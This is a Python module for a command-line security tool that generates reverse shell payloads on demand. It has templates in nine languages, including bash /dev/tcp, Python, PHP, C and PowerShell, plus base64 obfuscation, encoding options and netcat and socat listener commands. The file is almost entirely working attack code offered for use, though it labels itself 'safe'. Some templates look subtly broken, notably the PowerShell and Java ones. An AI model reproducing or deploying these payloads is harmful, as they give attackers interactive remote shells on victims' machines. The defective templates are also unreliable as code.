"""
Shell Generator Tool
Generate reverse shell payloads
"""

from vantic.utils import (
    print_header, print_subheader, print_success, print_error, print_info,
    print_warning, print_box, kv, Colors, emit_json
)

META = {
    "name": "shell",
    "title": "Shell Generator",
    "category": "EXPLOITATION",
    "description": "Reverse shell payload generator",
    "risk": "safe",
    "examples": [
        "vantic shell bash --lhost 10.0.0.5 --lport 4444",
        "vantic shell python --lhost 10.0.0.5 --lport 4444 --obfuscate",
    ],
    "flow": [
        ("sub", "language", "Language (python/bash/php/perl/ruby/go/java/c/powershell)", "bash"),
        ("opt", "--lhost", "Listener IP (lhost)", None),
        ("opt", "--lport", "Listener port", "4444"),
        ("flag", "--obfuscate", "Obfuscate (python only)?"),
    ],
    "choices": {"language": ['python', 'bash', 'php', 'perl', 'ruby', 'go',
                           'java', 'c', 'powershell']},
    "guard": {},
}

SHELLS = {
    'python': '''\
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
''',
    'bash': '''\
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
''',
    'php': '''\
<?php
$sock=fsockopen("{lhost}",{lport});
exec("/bin/bash -i <&3 >&3 2>&3");
?>
''',
    'perl': r'''\
exec "perl -e 'use Socket;\$i=\"{lhost}\";\$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}';";
''',
    'ruby': '''\
require 'socket';
s=TCPSocket.new("{lhost}",{lport});
while(cmd=s.gets);IO.popen(cmd,"r"){|io|s.print io.read}end
''',
    'go': '''\
package main
import "os/exec"
import "net"
func main() {
    c, _ := net.Dial("tcp", "{lhost}:{lport}")
    cmd := exec.Command("/bin/bash")
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}
''',
    'java': '''\
r=new ProcessBuilder("bash");
P p=r.start();
Socket s=new Socket("{lhost}",{lport});
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  s.flush();
  po.flush();
  so.flush();
  Thread.sleep(50);
  try{
    p.exitValue();
    break;
  }catch(Exception e){}
}
''',
    'c': '''\
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in host;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    host.sin_family = AF_INET;
    host.sin_port = htons({lport});
    host.sin_addr.s_addr = inet_addr("{lhost}");
    connect(sock, (struct sockaddr*)&host, sizeof(host));
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    system("/bin/sh -i");
    close(sock);
    return 0;
}
''',
    'powershell': '''\
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (New-Object -TypeName System.Diagnostics.ProcessStartInfo).StartFileName = "cmd.exe"
    $sendback.Arguments = "/c $data"
    $sendback.RedirectStandardOutput = $true
    $sendback.RedirectStandardError = $true
    $sendback.UseShellExecute = $false
    $process = New-Object -TypeName System.Diagnostics.Process
    $process.StartInfo = $sendback
    $process.Start() | Out-Null
    $sendback2 = ($process.StandardOutput.ReadToEnd() + $process.StandardError.ReadToEnd())
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
'''
}

LISTENERS = [
    ('netcat', 'nc -lvnp {lport}'),
    ('netcat (openbsd)', 'ncat -lvnp {lport}'),
    ('socat', 'socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:"/bin/bash -i"'),
]


def encode_payload(payload, encoder):
    if encoder == 'base64':
        import base64
        return base64.b64encode(payload.encode()).decode()
    if encoder == 'rot13':
        import codecs
        return codecs.encode(payload, 'rot13')
    return payload


def obfuscate_python(payload):
    import base64
    encoded = base64.b64encode(payload.encode()).decode()
    return f"import base64;exec(base64.b64decode('{encoded}').decode())"


def add_arguments(parser):
    import argparse
    shell_subparsers = parser.add_subparsers(dest='language')
    for lang in ['python', 'bash', 'php', 'perl', 'ruby', 'go', 'java', 'c', 'powershell']:
        lang_parser = shell_subparsers.add_parser(lang, help=f'{lang.title()} reverse shell')
        lang_parser.add_argument('--json', action='store_true', default=argparse.SUPPRESS,
                                 help=argparse.SUPPRESS)
        lang_parser.add_argument('--lhost', required=True, help='Listener IP')
        lang_parser.add_argument('--lport', required=True, type=int, help='Listener port')
        lang_parser.add_argument('--encoder', choices=['base64', 'rot13'], help='Encode payload')
        lang_parser.add_argument('--obfuscate', action='store_true', help='Obfuscate code')


def run(args):
    """Run shell generator."""
    language = args.language
    lhost = args.lhost
    lport = args.lport
    encoder = getattr(args, 'encoder', None)
    obfuscate = getattr(args, 'obfuscate', False)

    if not language or language not in SHELLS:
        print_error(f"Unknown language: {language}")
        print_info(f"Available: {', '.join(SHELLS)}")
        return

    payload = SHELLS[language].format(lhost=lhost, lport=lport)

    if obfuscate and language == 'python':
        payload = obfuscate_python(payload)
    elif obfuscate:
        print_warning(f"Obfuscation is only implemented for python - ignoring --obfuscate")

    if encoder:
        payload = encode_payload(payload, encoder)

    print_header("REVERSE SHELL", language.upper())
    kv("Listener", f"{lhost}:{lport}", Colors.BOLD)
    if encoder:
        kv("Encoder", encoder)
    if obfuscate and language == 'python':
        kv("Obfuscated", "yes")
    print()

    print_subheader("PAYLOAD")
    print_box(payload.strip(), width=76, color=Colors.BRIGHT_CYAN)

    print_subheader("LISTENER")
    for name, cmd in LISTENERS:
        print(f"  {Colors.BRIGHT_GREEN}[+]{Colors.RESET} {Colors.DIM}{name:<18}{Colors.RESET} "
              f"{Colors.CYAN}{cmd.format(lport=lport)}{Colors.RESET}")

    print()
    if encoder:
        print_info("Payload is encoded - decode it on the target before execution")
    if getattr(args, 'json', False):
        emit_json({"tool": "shell", "language": language, "lhost": lhost,
                   "lport": lport, "payload": payload.strip()})
    print_success("Payload generated")
